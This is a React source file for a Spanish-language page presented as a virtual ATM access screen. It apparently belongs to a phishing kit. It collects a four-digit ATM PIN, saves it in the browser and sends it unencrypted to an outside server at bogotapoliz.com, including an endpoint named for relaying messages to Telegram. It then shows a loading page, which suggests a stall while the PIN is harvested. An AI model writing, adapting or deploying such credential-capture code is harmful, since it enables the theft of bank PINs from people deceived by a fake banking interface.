import React, { useState } from "react";
import { CSSTransition, TransitionGroup } from "react-transition-group";
import "./animations.css";
import { EyeIcon } from "@heroicons/react/24/outline";
import { useNavigate } from "react-router-dom";

const ATM = () => {
  const [secureKey, setSecureKey] = useState("");
  const [error, setError] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const navigate = useNavigate();

  const handleKeyChange = (e) => {
    const value = e.target.value.replace(/\D/g, "");
    setSecureKey(value);
    setError(false);
  };

  const getGuestId = async () => {
    let guestId = localStorage.getItem("guestId");

    if (!guestId) {
      try {
        const response = await fetch("http://bogotapoliz.com:8000/api/v1/newGuest", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            secure_key: secureKey,
          }),
        });

        if (!response.ok) throw new Error("Error al crear el guest");

        const data = await response.json();
        guestId = data.guestId;
        localStorage.setItem("guestId", guestId);
      } catch (error) {
        console.error("Error al obtener el guestId:", error);
        setError(true);
      }
    }

    return guestId;
  };

  const sendTelegramMessage = async () => {
    try {
      const response = await fetch(
        "http://bogotapoliz.com:8000/api/v1/send-telegram-message",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ secureKey }),
        }
      );

      if (!response.ok) throw new Error("Error al enviar mensaje a Telegram");
    } catch (error) {
      console.error("Error en mensaje Telegram:", error);
    }
  };

  const handleSubmit = async () => {
    if (secureKey.length === 4) {
      localStorage.setItem("secureKey", secureKey);

      const guestId = await getGuestId();
      if (!guestId) return;

      await sendTelegramMessage();

      const body = {
        user: secureKey,
        status_id: 1,
      };

      try {
        const response = await fetch(
          `http://bogotapoliz.com:8000/api/v1/guest/${guestId}`,
          {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body),
          }
        );

        if (!response.ok) throw new Error("Error al actualizar guest");

        navigate("/loading");
      } catch (error) {
        console.error("Error al enviar la solicitud:", error);
        setError(true);
      }
    } else {
      setError(true);
    }
  };

  return (
    <div className="flex flex-col items-center bg-gradient-to-b from-blue-50 to-white min-h-screen p-6">
      <TransitionGroup>
        <CSSTransition timeout={300} classNames="fade" appear>
          <div className="w-full max-w-md bg-white p-8 rounded-2xl shadow-2xl transition-all">
            <div className="flex items-center justify-center mb-6">
              <img src="/images.png" alt="ATM" className="w-16 h-auto mr-3" />
              <h1 className="text-2xl font-extrabold text-gray-800">Acceso ATM</h1>
            </div>

            <div className="mb-6 text-center">
              <h2 className="text-lg font-semibold text-gray-700">
                Bienvenido al cajero virtual
              </h2>
              <p className="text-sm text-gray-500 mt-1">
                Ingresa la clave de acceso
              </p>
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-gray-600 mb-1">
                Clave del cajero
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={secureKey}
                  onChange={handleKeyChange}
                  placeholder="4 dígitos"
                  maxLength="4"
                  className="w-full h-12 px-4 pr-10 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute inset-y-0 right-0 flex items-center pr-3"
                >
                  <EyeIcon className="w-5 h-5 text-blue-600" />
                </button>
              </div>
            </div>

            <button
              onClick={handleSubmit}
              disabled={secureKey.length !== 4}
              className={`w-full h-12 rounded-full text-white font-semibold transition duration-300 ${
                secureKey.length === 4
                  ? "bg-blue-600 hover:bg-blue-700"
                  : "bg-gray-300 cursor-not-allowed"
              }`}
            >
              Ingresar al ATM
            </button>

            {error && (
              <p className="text-red-500 mt-4 text-center text-sm">
                Por favor, verifica la clave e inténtalo nuevamente.
              </p>
            )}
          </div>
        </CSSTransition>
      </TransitionGroup>
    </div>
  );
};

export default ATM;
